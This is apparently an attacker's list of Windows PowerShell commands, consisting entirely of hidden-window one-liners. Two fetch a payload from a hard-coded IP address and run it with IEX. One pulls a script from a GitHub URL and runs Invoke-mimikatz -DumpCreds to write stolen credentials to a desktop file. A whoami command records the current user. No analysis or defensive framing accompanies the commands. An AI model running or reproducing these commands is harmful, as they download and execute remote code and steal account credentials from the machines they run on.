C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://52.29.134.186:80/index.php');"
whoami > C:\users\tomcat\desktop\who.txt
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -C $objXmlHttp = New-Object -ComObject MSXML2.ServerXMLHTTP; $objXmlHttp.Open("GET", "https://github.com/ofswbug/a/blob/main/Invoke-memelon.ps1?raw=true", $False);  $objXmlHttp.Send(); $objXmlHttp.responseText | iex; Invoke-mimikatz -DumpCreds > c:\users\tomcat\desktop\creds.txt
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -C $objXmlHttp = New-Object -ComObject MSXML2.ServerXMLHTTP; $objXmlHttp.Open("GET", "http://52.29.134.186:80/index.php", $False);  $objXmlHttp.Send(); $objXmlHttp.responseText | iex; 
